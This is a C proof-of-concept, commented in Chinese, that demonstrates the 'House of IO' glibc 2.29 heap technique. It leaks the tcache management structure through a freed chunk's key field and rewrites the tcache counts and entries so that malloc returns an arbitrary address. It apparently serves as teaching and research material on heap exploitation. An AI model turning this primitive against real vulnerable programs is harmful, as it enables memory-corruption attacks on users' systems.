/*
 * House of IO：glibc 2.29 的 char-counts 布局。
 *
 * 漏洞模型：free 后仍能读写用户对象的 +8 字段（UAF）。2.29 在 free 到
 * tcache 时把 e->key 写成 tcache_perthread_struct 自身地址，这等于无偿
 * 泄露管理结构；随后直接改 counts/entries，让 malloc 返回任意地址。
 *
 * 2.30 起 counts 由 char[64] 改为 uint16_t[64]，请用另一份 PoC；
 * 2.34 起 key 是随机进程值，不再泄露 tcache 指针，原始 House of IO 结束。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

struct freed_overlay {
    void *next;
    void *key;
};

struct tcache_229 {
    unsigned char counts[64];
    void *entries[64];
};

static uint64_t target[2];

int main(void)
{
    struct freed_overlay *victim;
    struct tcache_229 *tcache;
    void *result;

    setbuf(stdout, NULL);

    victim = malloc(0x10);            /* 物理 size=0x20，属于 tc_idx=0 */
    if (victim == NULL)
        return 1;

    free(victim);

    /* UAF 读取：2.29 的 tcache_put 执行 e->key = tcache。 */
    tcache = victim->key;
    assert(tcache != NULL);

    /* 漏洞模拟：控制 tcache metadata。target 是 0x10 对齐的 BSS 数组，
     * target[0]=0 也能让 tcache_get 读取一个干净的 next。
     */
    tcache->counts[0] = 1;
    tcache->entries[0] = target;

    result = malloc(0x10);
    assert(result == target);

    printf("[+] IO：tcache=%p，结果=%p\n",
           (void *)tcache, result);
    return 0;
}
